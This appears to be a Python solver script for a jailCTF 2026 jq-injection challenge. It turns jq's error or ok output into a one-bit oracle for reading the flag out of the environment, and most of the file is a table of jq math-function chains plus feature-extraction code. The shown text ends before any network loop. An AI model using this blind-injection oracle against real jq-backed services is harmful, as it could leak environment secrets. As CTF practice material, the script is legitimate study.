#!/usr/bin/env python3
"""
Solver for jailCTF 2026 "just another injection challenge".

The challenge only accepts lowercase letters and '|'.  We turn jq's process
exit status into a one-bit oracle:

    <numeric feature>|<domain-filter chain>|error

If the target value is present, jq reaches `error` and server.py prints
"error".  Otherwise every value is filtered out and server.py prints "ok".

Local proof:
  python3 solve.py local --server server.py \
      --flag 'jail{flag_will_be_here_on_remote}'

Remote:
  python3 solve.py remote HOST PORT
"""
from __future__ import annotations

import argparse
import json
import os
import re
import socket
import string
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Iterable, Sequence

SOLVER_VERSION = "2026-07-27-v2-standalone"
DEFAULT_CHARSET = string.ascii_lowercase + string.digits + "_"
BASE = "env|flatten|sort|last"
TOKEN_RE = re.compile(rb"(?:^|\n|expr: )(ok|error|blocked)\n")

EXPECTED_CHAIN_COUNT = 225
EMBEDDED_CHAINS_JSON = r'''
{
  "0": [
    "acos"
  ],
  "1": [
    "asin"
  ],
  "2": [
    "log",
    "atanh"
  ],
  "3": [
    "lgamma",
    "atanh"
  ],
  "4": [
    "lgamma",
    "frexp|last",
    "asin"
  ],
  "5": [
    "lgamma",
    "trunc",
    "lgamma",
    "acos"
  ],
  "7": [
    "floor",
    "sinh",
    "cosh",
    "tan",
    "acosh"
  ],
  "9": [
    "log",
    "asinh",
    "tan",
    "sqrt",
    "frexp|last",
    "lgamma"
  ],
  "10": [
    "round",
    "sqrt",
    "lgamma",
    "atanh",
    "trunc"
  ],
  "11": [
    "cos",
    "logb",
    "tan",
    "erf",
    "modf|last"
  ],
  "12": [
    "erfc",
    "logb",
    "tan",
    "tan",
    "atanh",
    "asinh",
    "acosh"
  ],
  "13": [
    "asinh",
    "lgamma",
    "acos",
    "frexp|last",
    "erfc",
    "modf|last"
  ],
  "14": [
    "acosh",
    "lgamma",
    "acosh",
    "sin",
    "frexp|last",
    "logb"
  ],
  "15": [
    "asinh",
    "tan",
    "atanh",
    "atanh",
    "log",
    "atan",
    "asin",
    "trunc"
  ],
  "16": [
    "atan",
    "abs",
    "tan",
    "significand",
    "asin"
  ],
  "17": [
    "trunc",
    "tan",
    "log",
    "asinh",
    "acosh",
    "log",
    "trunc"
  ],
  "19": [
    "erfc",
    "lgamma",
    "sin",
    "cbrt",
    "frexp|last"
  ],
  "20": [
    "round",
    "cbrt",
    "log",
    "atanh",
    "round",
    "asinh",
    "floor",
    "log"
  ],
  "21": [
    "trunc",
    "sin",
    "asin",
    "asin",
    "acosh",
    "asin",
    "floor"
  ],
  "22": [
    "sin",
    "frexp|last",
    "cos",
    "tan",
    "acosh"
  ],
  "24": [
    "log",
    "cos",
    "lgamma",
    "floor",
    "floor",
    "significand",
    "modf|first",
    "acos",
    "acos"
  ],
  "25": [
    "asinh",
    "tan",
    "atanh",
    "acosh",
    "modf|last"
  ],
  "26": [
    "acosh",
    "tan",
    "acosh",
    "erfc",
    "asin",
    "round"
  ],
  "28": [
    "acosh",
    "tan",
    "acosh",
    "atanh",
    "sqrt",
    "asin",
    "acosh"
  ],
  "29": [
    "exp",
    "acosh",
    "cosh",
    "modf|first",
    "asin",
    "asin",
    "acos",
    "rint",
    "log"
  ],
  "30": [
    "cosh",
    "tan",
    "sin",
    "atanh",
    "erf",
    "modf|last"
  ],
  "31": [
    "cbrt",
    "sin",
    "sqrt",
    "log",
    "cbrt",
    "round",
    "logb"
  ],
  "33": [
    "sin",
    "asin",
    "acosh",
    "acosh"
  ],
  "36": [
    "atan",
    "acosh",
    "asin",
    "atan",
    "floor"
  ],
  "37": [
    "cos",
    "sinh",
    "asin",
    "acosh",
    "logb",
    "logb",
    "acosh"
  ],
  "38": [
    "floor",
    "sin",
    "sqrt",
    "acos",
    "atanh",
    "log",
    "acosh"
  ],
  "39": [
    "log",
    "frexp|first",
    "atanh",
    "sin",
    "atanh",
    "log",
    "round",
    "logb"
  ],
  "40": [
    "sin",
    "atanh",
    "acos",
    "lgamma",
    "log",
    "log"
  ],
  "41": [
    "tan",
    "cbrt",
    "modf|first",
    "acos",
    "atanh",
    "exp",
    "tanh",
    "trunc"
  ],
  "43": [
    "log",
    "modf|first",
    "atanh",
    "acos",
    "frexp|last",
    "logb",
    "acosh"
  ],
  "44": [
    "sin",
    "log",
    "logb",
    "log"
  ],
  "45": [
    "log",
    "tan",
    "atanh",
    "acosh",
    "sin",
    "frexp|last"
  ],
  "46": [
    "trunc",
    "sin",
    "sin",
    "tan",
    "asin",
    "sinh",
    "exp",
    "logb",
    "floor",
    "lgamma"
  ],
  "47": [
    "cbrt",
    "tan",
    "asin",
    "erf",
    "acos",
    "atanh",
    "floor",
    "acosh"
  ],
  "48": [
    "log",
    "cbrt",
    "tan",
    "log",
    "erf",
    "floor"
  ],
  "50": [
    "sqrt",
    "tan",
    "log",
    "log",
    "logb",
    "acosh"
  ],
  "51": [
    "tan",
    "atanh",
    "acosh",
    "asin",
    "asinh",
    "acosh"
  ],
  "52": [
    "cbrt",
    "sqrt",
    "tan",
    "cos",
    "sinh",
    "asin",
    "rint",
    "rint",
    "logb"
  ],
  "53": [
    "sin",
    "sin",
    "lgamma",
    "asin",
    "atanh",
    "logb",
    "erfc",
    "erfc",
    "nearbyint"
  ],
  "56": [
    "acosh",
    "tan",
    "modf|last",
    "frexp|last",
    "logb",
    "significand",
    "ceil",
    "log"
  ],
  "57": [
    "cosh",
    "tan",
    "acos",
    "atanh",
    "trunc",
    "lgamma"
  ],
  "58": [
    "tan",
    "floor",
    "exp",
    "modf|first",
    "acos",
    "log",
    "round"
  ],
  "60": [
    "cbrt",
    "tan",
    "asin",
    "sin",
    "acos",
    "erf",
    "log",
    "trunc"
  ],
  "61": [
    "cbrt",
    "tan",
    "log",
    "sqrt",
    "cbrt",
    "tanh",
    "asinh",
    "frexp|last"
  ],
  "62": [
    "log",
    "tan",
    "acosh",
    "atanh",
    "logb",
    "sqrt"
  ],
  "63": [
    "cbrt",
    "frexp|first",
    "atanh",
    "tanh",
    "atanh",
    "log",
    "trunc"
  ],
  "65": [
    "log",
    "exp",
    "trunc",
    "cbrt",
    "significand",
    "asin"
  ],
  "66": [
    "modf|last",
    "sinh",
    "trunc",
    "tan",
    "sqrt",
    "acosh",
    "round",
    "floor",
    "sin",
    "frexp|last"
  ],
  "68": [
    "cbrt",
    "tan",
    "sqrt",
    "asinh",
    "atanh",
    "trunc",
    "log",
    "modf|first",
    "frexp|last"
  ],
  "69": [
    "log",
    "log",
    "sinh",
    "frexp|first",
    "modf|first",
    "erf",
    "asin",
    "modf|last"
  ],
  "70": [
    "lgamma",
    "sin",
    "logb",
    "abs",
    "sqrt",
    "sin",
    "log",
    "trunc"
  ],
  "71": [
    "tan",
    "tan",
    "sqrt",
    "sin",
    "frexp|first",
    "asinh",
    "frexp|last"
  ],
  "72": [
    "tan",
    "cbrt",
    "atanh",
    "atanh",
    "lgamma",
    "sqrt",
    "atan",
    "abs",
    "acosh",
    "round"
  ],
  "73": [
    "tan",
    "asin",
    "log",
    "exp",
    "asinh",
    "asin",
    "sinh",
    "modf|last",
    "frexp|last",
    "nearbyint",
    "logb"
  ],
  "74": [
    "floor",
    "acosh",
    "modf|first",
    "erf",
    "asin",
    "trunc"
  ],
  "75": [
    "atan",
    "atan",
    "acosh",
    "log",
    "cos",
    "ceil"
  ],
  "76": [
    "rint",
    "log",
    "frexp|first",
    "acos",
    "abs",
    "atanh",
    "rint",
    "logb",
    "acosh"
  ],
  "78": [
    "asinh",
    "cos",
    "lgamma",
    "atanh",
    "log",
    "ceil",
    "atan",
    "trunc",
    "nearbyint",
    "tanh",
    "acos",
    "acos"
  ],
  "80": [
    "tan",
    "exp",
    "ceil",
    "significand",
    "frexp|first",
    "atanh",
    "log",
    "sqrt",
    "floor"
  ],
  "81": [
    "cbrt",
    "frexp|first",
    "acos",
    "asin",
    "round",
    "abs",
    "acosh"
  ],
  "83": [
    "tan",
    "modf|first",
    "sinh",
    "atanh",
    "round",
    "lgamma"
  ],
  "84": [
    "sin",
    "significand",
    "tan",
    "modf|first",
    "acos",
    "frexp|first",
    "sqrt",
    "frexp|first",
    "cos",
    "atanh",
    "log",
    "round"
  ],
  "85": [
    "acosh",
    "tan",
    "cos",
    "exp",
    "acos",
    "atanh",
    "logb",
    "ceil",
    "erf",
    "tan",
    "acosh"
  ],
  "86": [
    "acosh",
    "cos",
    "log",
    "sinh",
    "atanh",
    "trunc",
    "logb"
  ],
  "87": [
    "sqrt",
    "sin",
    "log",
    "tan",
    "acosh",
    "atanh"
  ],
  "88": [
    "sqrt",
    "sin",
    "log",
    "tan",
    "log",
    "frexp|last",
    "sin",
    "frexp|last"
  ],
  "90": [
    "tan",
    "modf|first",
    "acos",
    "trunc",
    "lgamma"
  ],
  "94": [
    "cbrt",
    "tan",
    "modf|first",
    "log",
    "cbrt",
    "frexp|last",
    "logb"
  ],
  "95": [
    "lgamma",
    "exp",
    "round",
    "abs",
    "sin",
    "log",
    "frexp|last",
    "lgamma"
  ],
  "96": [
    "cbrt",
    "exp",
    "sin",
    "logb",
    "abs",
    "tan",
    "atanh",
    "sqrt"
  ],
  "98": [
    "cbrt",
    "cosh",
    "cos",
    "asin",
    "atan",
    "acosh"
  ],
  "99": [
    "tan",
    "trunc",
    "tan",
    "asin",
    "log",
    "ceil",
    "logb"
  ],
  "100": [
    "exp",
    "sin",
    "lgamma",
    "round",
    "floor",
    "significand",
    "log",
    "sin",
    "round"
  ],
  "101": [
    "lgamma",
    "round",
    "exp",
    "tan",
    "tan",
    "acos",
    "trunc",
    "log",
    "frexp|last"
  ],
  "102": [
    "sin",
    "tan",
    "tan",
    "sin",
    "atanh",
    "asin",
    "nearbyint",
    "logb"
  ],
  "104": [
    "tan",
    "sin",
    "lgamma",
    "atanh",
    "floor",
    "acosh"
  ],
  "106": [
    "floor",
    "acosh",
    "acosh",
    "tan",
    "atanh",
    "cbrt",
    "frexp|first",
    "sin",
    "asin",
    "cbrt",
    "sinh",
    "cos",
    "acos",
    "atanh",
    "log",
    "floor"
  ],
  "108": [
    "cos",
    "log",
    "atanh",
    "lgamma",
    "atanh",
    "acos"
  ],
  "111": [
    "log",
    "tan",
    "acosh",
    "erf",
    "modf|last"
  ],
  "112": [
    "log",
    "tan",
    "logb",
    "tan",
    "sqrt",
    "asin",
    "nearbyint"
  ],
  "113": [
    "log",
    "tan",
    "ceil",
    "cosh",
    "round",
    "tan",
    "sqrt",
    "rint",
    "tan",
    "abs",
    "tan",
    "atanh"
  ],
  "114": [
    "tan",
    "asinh",
    "tanh",
    "tan",
    "atanh",
    "log",
    "trunc",
    "sqrt"
  ],
  "116": [
    "tan",
    "asin",
    "erfc",
    "cos",
    "sqrt",
    "acos",
    "atanh",
    "trunc",
    "lgamma"
  ],
  "117": [
    "tan",
    "asin",
    "acosh",
    "atanh",
    "asin",
    "floor"
  ],
  "118": [
    "cos",
    "log",
    "tan",
    "round",
    "cbrt",
    "tan",
    "round",
    "acos"
  ],
  "120": [
    "sqrt",
    "sqrt",
    "lgamma",
    "acos",
    "logb",
    "sin",
    "log"
  ],
  "121": [
    "sqrt",
    "cos",
    "log",
    "trunc",
    "sin",
    "sqrt"
  ],
  "123": [
    "acosh",
    "tan",
    "asin",
    "tan",
    "logb",
    "log"
  ],
  "124": [
    "tan",
    "acosh",
    "sin",
    "lgamma",
    "round",
    "tan",
    "acos"
  ],
  "125": [
    "cos",
    "tan",
    "acosh",
    "cbrt",
    "acos",
    "acosh"
  ],
  "126": [
    "sinh",
    "cos",
    "tanh",
    "acos",
    "sinh",
    "acosh",
    "asin",
    "tan",
    "acosh",
    "atanh",
    "floor"
  ],
  "129": [
    "acosh",
    "sqrt",
    "tan",
    "atanh",
    "logb",
    "logb"
  ],
  "130": [
    "tan",
    "acosh",
    "tan",
    "exp",
    "exp",
    "asin"
  ],
  "131": [
    "exp",
    "frexp|first",
    "acos",
    "frexp|last",
    "tan",
    "acos"
  ],
  "132": [
    "lgamma",
    "frexp|first",
    "erf",
    "asin",
    "trunc"
  ],
  "133": [
    "cos",
    "atanh",
    "acos",
    "atanh",
    "modf|last",
    "log",
    "significand",
    "asinh",
    "asin"
  ],
  "134": [
    "lgamma",
    "asinh",
    "sin",
    "sqrt",
    "tan",
    "acosh",
    "asinh",
    "lgamma",
    "floor",
    "tan",
    "atanh"
  ],
  "136": [
    "tan",
    "acosh",
    "atanh",
    "acos",
    "lgamma",
    "acosh"
  ],
  "137": [
    "cos",
    "lgamma",
    "atanh",
    "floor",
    "cosh",
    "ceil",
    "lgamma"
  ],
  "138": [
    "acosh",
    "atan",
    "cos",
    "log",
    "lgamma",
    "asin",
    "round",
    "acosh"
  ],
  "139": [
    "log",
    "frexp|first",
    "sqrt",
    "tan",
    "asin",
    "atan",
    "trunc"
  ],
  "141": [
    "sqrt",
    "cos",
    "tan",
    "atanh",
    "modf|last",
    "log"
  ],
  "142": [
    "tan",
    "acos",
    "atanh",
    "atanh",
    "trunc",
    "logb"
  ],
  "143": [
    "tan",
    "lgamma",
    "modf|last",
    "tan",
    "trunc",
    "cbrt",
    "logb",
    "cos",
    "frexp|last"
  ],
  "144": [
    "sinh",
    "tan",
    "sqrt",
    "atanh",
    "log",
    "frexp|last",
    "log"
  ],
  "145": [
    "cos",
    "sinh",
    "acosh",
    "cbrt",
    "frexp|last"
  ],
  "146": [
    "tan",
    "floor",
    "rint",
    "tan",
    "exp",
    "cos",
    "trunc"
  ],
  "149": [
    "round",
    "lgamma",
    "cosh",
    "modf|last",
    "tan",
    "atanh",
    "atanh",
    "asin",
    "acosh"
  ],
  "151": [
    "frexp|first",
    "cbrt",
    "asin",
    "acos",
    "frexp|last",
    "tan",
    "acos"
  ],
  "154": [
    "floor",
    "modf|last",
    "tan",
    "erf",
    "sin",
    "sqrt",
    "sqrt",
    "significand",
    "cos",
    "rint"
  ],
  "155": [
    "acosh",
    "log",
    "tan",
    "tan",
    "atanh",
    "asinh",
    "modf|first",
    "sinh",
    "log",
    "log"
  ],
  "156": [
    "cos",
    "log",
    "atanh",
    "atanh",
    "trunc",
    "rint",
    "logb"
  ],
  "157": [
    "frexp|first",
    "sqrt",
    "tan",
    "acos",
    "abs",
    "frexp|last",
    "significand",
    "modf|first"
  ],
  "158": [
    "sqrt",
    "cos",
    "asin",
    "acosh",
    "acosh"
  ],
  "159": [
    "significand",
    "cos",
    "lgamma",
    "acosh",
    "sqrt",
    "erfc",
    "round"
  ],
  "162": [
    "cosh",
    "tan",
    "log",
    "log",
    "atanh",
    "acosh",
    "frexp|last",
    "frexp|last",
    "acosh"
  ],
  "163": [
    "frexp|first",
    "acos",
    "sinh",
    "asin",
    "rint",
    "log"
  ],
  "165": [
    "tan",
    "ceil",
    "tan",
    "asin",
    "log",
    "sqrt"
  ],
  "166": [
    "asinh",
    "erfc",
    "sqrt",
    "frexp|first",
    "log",
    "lgamma",
    "tan",
    "acosh",
    "atanh",
    "acosh"
  ],
  "167": [
    "tan",
    "acos",
    "asin",
    "rint",
    "log"
  ],
  "168": [
    "tan",
    "ceil",
    "frexp|first",
    "asin",
    "acosh"
  ],
  "170": [
    "tan",
    "log",
    "acos",
    "floor",
    "significand",
    "log"
  ],
  "171": [
    "ceil",
    "tan",
    "erfc",
    "sinh",
    "log",
    "trunc",
    "cos",
    "atanh",
    "frexp|last",
    "lgamma"
  ],
  "172": [
    "asinh",
    "cosh",
    "tan",
    "acos",
    "ceil",
    "lgamma",
    "trunc"
  ],
  "174": [
    "abs",
    "tan",
    "log",
    "acos",
    "logb",
    "sin",
    "frexp|last"
  ],
  "175": [
    "frexp|first",
    "log",
    "tan",
    "tan",
    "acos",
    "frexp|first",
    "sinh",
    "sin",
    "frexp|last"
  ],
  "176": [
    "lgamma",
    "round",
    "round",
    "tan",
    "asin",
    "log",
    "rint",
    "trunc",
    "round",
    "logb",
    "sinh",
    "sin",
    "frexp|last"
  ],
  "177": [
    "tan",
    "asinh",
    "acosh",
    "asin",
    "atanh",
    "logb",
    "sqrt"
  ],
  "179": [
    "frexp|first",
    "tan",
    "asin",
    "asin",
    "nearbyint",
    "rint",
    "cosh",
    "lgamma",
    "trunc"
  ],
  "181": [
    "frexp|first",
    "sqrt",
    "asin",
    "asin",
    "nearbyint",
    "log"
  ],
  "183": [
    "tan",
    "acosh",
    "log",
    "frexp|last",
    "acosh"
  ],
  "186": [
    "tan",
    "atanh",
    "sqrt",
    "atanh",
    "round",
    "acosh",
    "tan",
    "logb",
    "acosh"
  ],
  "187": [
    "significand",
    "log",
    "asinh",
    "log",
    "acos",
    "ceil",
    "tan",
    "ceil"
  ],
  "188": [
    "exp",
    "cos",
    "sqrt",
    "cbrt",
    "frexp|last"
  ],
  "190": [
    "tan",
    "cbrt",
    "sqrt",
    "cos",
    "exp",
    "frexp|first",
    "tan",
    "acosh",
    "acosh"
  ],
  "191": [
    "floor",
    "sinh",
    "floor",
    "tan",
    "acosh",
    "log",
    "trunc",
    "acos"
  ],
  "192": [
    "sinh",
    "frexp|first",
    "tan",
    "acosh",
    "acosh"
  ],
  "193": [
    "significand",
    "frexp|first",
    "atanh",
    "asin",
    "log",
    "lgamma",
    "acosh",
    "erfc",
    "sinh",
    "rint"
  ],
  "195": [
    "frexp|first",
    "atanh",
    "acosh",
    "lgamma",
    "trunc",
    "log"
  ],
  "196": [
    "tan",
    "log",
    "acosh",
    "sqrt",
    "acos",
    "asinh",
    "floor"
  ],
  "197": [
    "log",
    "sin",
    "asin",
    "lgamma",
    "log",
    "trunc",
    "acosh"
  ],
  "199": [
    "significand",
    "atan",
    "sqrt",
    "atanh",
    "logb",
    "log"
  ],
  "204": [
    "exp",
    "tan",
    "atanh",
    "abs",
    "ceil",
    "lgamma",
    "round",
    "log"
  ],
  "205": [
    "tan",
    "acosh",
    "logb",
    "frexp|first",
    "nearbyint"
  ],
  "207": [
    "abs",
    "log",
    "cos",
    "sqrt",
    "frexp|first",
    "sinh",
    "asin",
    "atanh",
    "log",
    "ceil",
    "acosh"
  ],
  "208": [
    "rint",
    "tan",
    "atanh",
    "log",
    "log",
    "ceil",
    "rint",
    "logb",
    "ceil",
    "logb"
  ],
  "209": [
    "tan",
    "trunc",
    "tan",
    "acosh",
    "logb",
    "log"
  ],
  "210": [
    "cosh",
    "sqrt",
    "sqrt",
    "tan",
    "logb",
    "acosh",
    "lgamma",
    "nearbyint"
  ],
  "211": [
    "significand",
    "modf|first",
    "exp",
    "cosh",
    "tan",
    "exp",
    "acosh",
    "asin",
    "log",
    "logb",
    "sin",
    "sqrt",
    "tan",
    "logb"
  ],
  "212": [
    "tan",
    "floor",
    "sqrt",
    "tan",
    "acosh",
    "atanh"
  ],
  "213": [
    "cosh",
    "significand",
    "tanh",
    "asin",
    "exp",
    "log",
    "asin",
    "acosh",
    "floor"
  ],
  "214": [
    "cos",
    "acos",
    "asinh",
    "asin",
    "log",
    "asin",
    "cosh",
    "floor",
    "tan",
    "erfc",
    "tanh",
    "acos",
    "atanh"
  ],
  "216": [
    "cosh",
    "cos",
    "acos",
    "acos",
    "atanh",
    "sqrt",
    "rint",
    "acosh"
  ],
  "217": [
    "exp",
    "cos",
    "logb",
    "modf|last",
    "abs",
    "logb",
    "log",
    "trunc"
  ],
  "218": [
    "sqrt",
    "tan",
    "lgamma",
    "acosh",
    "logb",
    "tan",
    "atanh"
  ],
  "219": [
    "cos",
    "sqrt",
    "tan",
    "atanh",
    "log",
    "trunc",
    "cbrt",
    "sqrt"
  ],
  "221": [
    "ceil",
    "cos",
    "cbrt",
    "sqrt",
    "sinh",
    "asin",
    "nearbyint",
    "asinh",
    "modf|last"
  ],
  "223": [
    "significand",
    "tan",
    "tan",
    "acos",
    "atanh",
    "sqrt",
    "cbrt",
    "acosh",
    "nearbyint"
  ],
  "224": [
    "tan",
    "significand",
    "log",
    "lgamma",
    "asin",
    "round",
    "log"
  ],
  "225": [
    "frexp|first",
    "erf",
    "tan",
    "acosh",
    "sqrt",
    "asin",
    "sqrt",
    "frexp|last"
  ],
  "226": [
    "cbrt",
    "frexp|first",
    "atanh",
    "asin",
    "round",
    "exp",
    "sin",
    "sin",
    "nearbyint"
  ],
  "230": [
    "tan",
    "tan",
    "atanh",
    "nearbyint",
    "lgamma"
  ],
  "231": [
    "trunc",
    "cos",
    "log",
    "tan",
    "asin",
    "acosh"
  ],
  "233": [
    "significand",
    "tan",
    "tan",
    "acos",
    "floor",
    "significand",
    "acosh"
  ],
  "235": [
    "ceil",
    "trunc",
    "sqrt",
    "sin",
    "log",
    "atanh",
    "frexp|last",
    "acosh"
  ],
  "236": [
    "lgamma",
    "tan",
    "acos",
    "floor",
    "log",
    "trunc"
  ],
  "237": [
    "round",
    "trunc",
    "cbrt",
    "sin",
    "abs",
    "log",
    "tan",
    "log",
    "frexp|last",
    "frexp|last",
    "lgamma"
  ],
  "239": [
    "significand",
    "sinh",
    "tan",
    "acos",
    "tan",
    "acosh",
    "floor",
    "sqrt",
    "logb"
  ],
  "240": [
    "floor",
    "cos",
    "lgamma",
    "acosh",
    "exp",
    "sinh",
    "nearbyint",
    "asin"
  ],
  "241": [
    "sqrt",
    "modf|first",
    "erf",
    "acos",
    "asin",
    "round",
    "log"
  ],
  "242": [
    "round",
    "abs",
    "tan",
    "atanh",
    "log",
    "tan",
    "acosh",
    "acos",
    "ceil",
    "log"
  ],
  "243": [
    "exp",
    "sin",
    "tan",
    "cbrt",
    "frexp|last",
    "sin",
    "frexp|last"
  ],
  "244": [
    "trunc",
    "cos",
    "sqrt",
    "cos",
    "atanh",
    "acos",
    "log",
    "frexp|last",
    "log"
  ],
  "245": [
    "log",
    "tan",
    "acos",
    "trunc",
    "trunc",
    "lgamma"
  ],
  "246": [
    "exp",
    "frexp|last",
    "sin",
    "frexp|last",
    "frexp|last",
    "logb",
    "ceil",
    "logb"
  ],
  "247": [
    "round",
    "cosh",
    "tan",
    "log",
    "acosh",
    "acos",
    "cos",
    "tan",
    "exp",
    "abs",
    "tanh",
    "asin",
    "asin"
  ],
  "248": [
    "cbrt",
    "tan",
    "frexp|last",
    "tan",
    "rint",
    "sqrt",
    "nearbyint",
    "lgamma"
  ],
  "250": [
    "log",
    "sin",
    "asin",
    "atanh",
    "lgamma",
    "trunc",
    "lgamma",
    "ceil",
    "significand",
    "lgamma"
  ],
  "251": [
    "log",
    "lgamma",
    "significand",
    "modf|first",
    "asin",
    "round",
    "logb"
  ],
  "252": [
    "round",
    "cos",
    "tan",
    "atanh",
    "log",
    "acosh"
  ],
  "253": [
    "lgamma",
    "tan",
    "sqrt",
    "frexp|last",
    "logb",
    "rint",
    "log"
  ],
  "255": [
    "frexp|first",
    "tan",
    "acosh",
    "trunc"
  ],
  "257": [
    "significand",
    "acosh",
    "sqrt",
    "erfc",
    "tan",
    "tan",
    "trunc"
  ],
  "258": [
    "cos",
    "atanh",
    "log",
    "tan",
    "asin",
    "acos",
    "atanh",
    "abs",
    "floor",
    "logb"
  ],
  "259": [
    "ceil",
    "significand",
    "acosh",
    "log",
    "cosh",
    "trunc",
    "lgamma",
    "atanh"
  ],
  "260": [
    "sqrt",
    "exp",
    "tan",
    "lgamma",
    "atanh",
    "ceil",
    "gamma",
    "logb"
  ],
  "261": [
    "nearbyint",
    "sqrt",
    "abs",
    "tan",
    "atanh",
    "lgamma",
    "acos",
    "acosh",
    "atan",
    "lgamma",
    "floor"
  ],
  "262": [
    "nearbyint",
    "exp",
    "logb",
    "sin",
    "sqrt",
    "sin",
    "logb",
    "logb",
    "log"
  ],
  "265": [
    "tan",
    "frexp|first",
    "asin",
    "nearbyint",
    "log"
  ],
  "266": [
    "lgamma",
    "cos",
    "exp",
    "acos",
    "frexp|last",
    "cos",
    "frexp|last"
  ],
  "267": [
    "asinh",
    "significand",
    "cos",
    "log",
    "rint",
    "tan",
    "asin",
    "sin",
    "rint"
  ],
  "268": [
    "round",
    "acosh",
    "sin",
    "log",
    "erf",
    "sin",
    "asin",
    "modf|last"
  ],
  "269": [
    "cos",
    "sqrt",
    "tan",
    "acos",
    "tan",
    "atanh",
    "floor",
    "acosh"
  ],
  "270": [
    "sinh",
    "ceil",
    "sin",
    "asin",
    "atan",
    "acosh"
  ],
  "271": [
    "tan",
    "acosh",
    "atanh",
    "log",
    "atanh",
    "modf|last"
  ],
  "272": [
    "sqrt",
    "tan",
    "asin",
    "round",
    "cosh",
    "logb"
  ],
  "273": [
    "round",
    "significand",
    "modf|first",
    "acos",
    "log",
    "asin",
    "cos",
    "atanh",
    "acosh",
    "acosh",
    "sqrt",
    "frexp|last",
    "logb"
  ],
  "274": [
    "tan",
    "acos",
    "atanh",
    "tan",
    "atanh",
    "acosh",
    "asin",
    "trunc"
  ],
  "275": [
    "nearbyint",
    "cos",
    "sqrt",
    "lgamma",
    "acos",
    "frexp|last",
    "logb"
  ],
  "276": [
    "lgamma",
    "nearbyint",
    "tan",
    "atanh",
    "acosh",
    "asin",
    "lgamma",
    "log",
    "exp",
    "cos",
    "frexp|last"
  ],
  "277": [
    "frexp|first",
    "acos",
    "asin",
    "round",
    "acosh"
  ],
  "278": [
    "tan",
    "acosh",
    "logb",
    "log"
  ],
  "279": [
    "sqrt",
    "tan",
    "acosh",
    "atanh",
    "log",
    "log",
    "log"
  ],
  "280": [
    "ceil",
    "log",
    "tan",
    "atanh",
    "atanh",
    "round",
    "significand",
    "lgamma"
  ],
  "282": [
    "exp",
    "sin",
    "frexp|last",
    "tan",
    "logb",
    "acos"
  ],
  "283": [
    "lgamma",
    "lgamma",
    "cos",
    "log",
    "erf",
    "trunc"
  ],
  "284": [
    "tan",
    "significand",
    "acosh",
    "atanh",
    "floor",
    "lgamma"
  ],
  "285": [
    "cosh",
    "round",
    "log",
    "cos",
    "sqrt",
    "log",
    "ceil",
    "round",
    "logb"
  ],
  "286": [
    "trunc",
    "tan",
    "sqrt",
    "lgamma",
    "atanh",
    "floor",
    "log"
  ],
  "287": [
    "tan",
    "log",
    "asin",
    "sinh",
    "asin",
    "log",
    "log"
  ],
  "288": [
    "cosh",
    "floor",
    "floor",
    "tan",
    "lgamma",
    "atanh",
    "asin",
    "acosh"
  ],
  "289": [
    "abs",
    "tan",
    "exp",
    "acos",
    "frexp|last",
    "logb"
  ],
  "290": [
    "tan",
    "acosh",
    "atanh",
    "acosh",
    "acosh"
  ],
  "291": [
    "cbrt",
    "sinh",
    "cos",
    "exp",
    "erf",
    "atanh",
    "frexp|first",
    "tan",
    "acosh",
    "modf|last"
  ],
  "292": [
    "acosh",
    "sin",
    "frexp|first",
    "asin",
    "sqrt",
    "sinh",
    "atanh",
    "logb"
  ],
  "293": [
    "tan",
    "acosh",
    "acos",
    "acosh",
    "frexp|last"
  ],
  "295": [
    "exp",
    "ceil",
    "sqrt",
    "sin",
    "log",
    "frexp|last",
    "gamma",
    "log"
  ],
  "296": [
    "cos",
    "significand",
    "acosh",
    "asin",
    "round",
    "log"
  ],
  "297": [
    "tan",
    "trunc",
    "tan",
    "rint",
    "erfc",
    "cosh",
    "asin"
  ],
  "298": [
    "sqrt",
    "tan",
    "floor",
    "log",
    "modf|last",
    "sqrt",
    "acosh",
    "tan",
    "rint",
    "lgamma"
  ]
}
'''


def nested_json(value, count: int) -> str:
    for _ in range(count):
        value = json.dumps(value, ensure_ascii=False, separators=(",", ":"))
    assert isinstance(value, str)
    return value


def codepoint_sum(text: str) -> int:
    return sum(map(ord, text))


def unique_codepoint_sum(text: str) -> int:
    return sum(set(map(ord, text)))


def decimal_fingerprint(value: int, kind: str) -> int:
    text = str(int(value))
    cps = list(map(ord, text))
    if kind == "len":
        return len(text)
    if kind == "first":
        return cps[0]
    if kind == "last":
        return cps[-1]
    if kind == "min":
        return min(cps)
    if kind == "max":
        return max(cps)
    if kind == "add":
        return sum(cps)
    if kind == "uniq":
        return sum(set(cps))
    if kind == "revjsonuniq":
        encoded = json.dumps(text, ensure_ascii=False, separators=(",", ":"))
        return unique_codepoint_sum(encoded)
    raise ValueError(kind)


@dataclass(frozen=True)
class Feature:
    name: str
    suffix: str
    evaluate: Callable[[int, int | None], int]


def build_features() -> list[Feature]:
    features: list[Feature] = [
        Feature("add", "flatten|add", lambda i, c: i if c is None else i + c),
        Feature("min", "flatten|min", lambda i, c: i if c is None else min(i, c)),
        Feature("max", "flatten|max", lambda i, c: i if c is None else max(i, c)),
        Feature(
            "uniqadd",
            "flatten|unique|add",
            lambda i, c: i if c is None or i == c else i + c,
        ),
    ]

    kinds = ("len", "first", "last", "min", "max", "add", "uniq", "revjsonuniq")
    for typ in ("impl", "flat", "rec"):
        for nesting in range(1, 6):
            if typ == "impl":
                prefix = ["flatten", "implode"]
            elif typ == "flat":
                prefix = ["flatten"]
            else:
                prefix = []
            checksum_parts = prefix + ["tojson"] * nesting + ["explode", "add"]

            def checksum(i: int, c: int | None, typ: str = typ, nesting: int = nesting) -> int:
                flat = [i] if c is None else [i, c]
                if typ == "impl":
                    base: object = "".join(chr(v) for v in flat)
                elif typ == "flat":
                    base = flat
                else:
                    base = [[i]] if c is None else [[i], c]
                return codepoint_sum(nested_json(base, nesting))

            for kind in kinds:
                parts = list(checksum_parts)
                if kind == "len":
                    parts += ["tostring", "length"]
                elif kind in ("first", "last", "min", "max", "add"):
                    parts += ["tostring", "explode", kind]
                elif kind == "uniq":
                    parts += ["tostring", "explode", "unique", "add"]
                else:
                    parts += ["tostring", "tojson", "explode", "unique", "add"]

                def evaluate(
                    i: int,
                    c: int | None,
                    checksum: Callable[[int, int | None], int] = checksum,
                    kind: str = kind,
                ) -> int:
                    return decimal_fingerprint(checksum(i, c), kind)

                features.append(
                    Feature(f"{typ}j{nesting}_{kind}", "|".join(parts), evaluate)
                )
    assert len(features) == 124
    return features


FEATURES = build_features()


